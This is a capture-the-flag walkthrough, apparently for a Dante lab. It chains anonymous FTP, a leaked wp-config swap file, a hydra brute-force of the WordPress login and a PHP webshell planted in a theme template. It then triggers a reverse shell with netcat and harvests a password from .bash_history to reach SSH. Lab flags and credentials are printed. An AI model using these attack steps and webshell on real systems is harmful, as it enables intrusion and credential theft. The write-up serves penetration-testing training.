Flag 1 in nmap output (/robots.txt):
```
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
```

# FTP

Nmap identified anonymous login: `ftp:ftp`

There is only 1 file `todo.txt`:
```
- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
```
=> Username: `James`

# WPscan

```bash
wpscan --enumerate vp,vt,tt,cb,dbe,u,m --url http://10.10.110.100:65000/wordpress

# [!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp
#  | Found By: Direct Access (Aggressive Detection)
```

Download file => VIM swap file:
```bash
http://10.10.110.100:65000/wordpress/.wp-config.php.swp

vim -r wp-config.php.swp
```
Contents:
```
/** MySQL database username */
define( 'DB_USER', 'shaun' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password' );
```
=> MySQL creds: `shaun:password`

# (Not required) Create custom wordlist

```bash
cewl http://10.10.110.100:65000/wordpress/
```

# WP Login Brute-Force

```bash
hydra -I -e sr -l james -P wordpress_wordlist.txt 10.10.110.100 -s 65000 http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect|empty"
```
=> Creds: `james:Toyota`

# WP Backend - RCE

Theme Editor -> Edit "Twenty Seventeen: 404 Template (404.php)"
Webshell:
```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
```
Execute cmd:
```
http://10.10.110.100:65000/wordpress/wp-content/themes/twentyseventeen/404.php?cmd=id
```

Reverse Shell:
https://www.revshells.com/ => PHP Pentest Monkey (with bash)

```bash
nc -vlnp 7777

# Navigate to URL to trigger the reverse shell:
# http://10.10.110.100:65000/wordpress/wp-content/themes/twentyseventeen/404.php
```
=> Shell as `www-data`

# Switch to user James

Try to switch to user james:
```bash
su james
# Toyota

cat flag.txt
# DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}
```

# Credential Search

```bash
ls -l /home
# drwxr-xr-x 16 balthazar balthazar 4096 Apr 14  2021 balthazar
# drwxr-xr-x 17 james     james     4096 Apr 14  2021 james

cd /home/james

ls -la

cat .bash_history
# cat .bash_history
# cd /home/balthazar
# rm .mysql_history
# mysql -u balthazar -p TheJoker12345!
```
=> Creds: `balthazar:TheJoker12345!`

# SSH as balthazar

SSH for balthazar is also possible:
```bash
ssh balthazar@10.10.110.100
# TheJoker12345!
```

Note:  SSH with `james:Toyota` doesnt work! So just SSH as balthazar and `su james`.

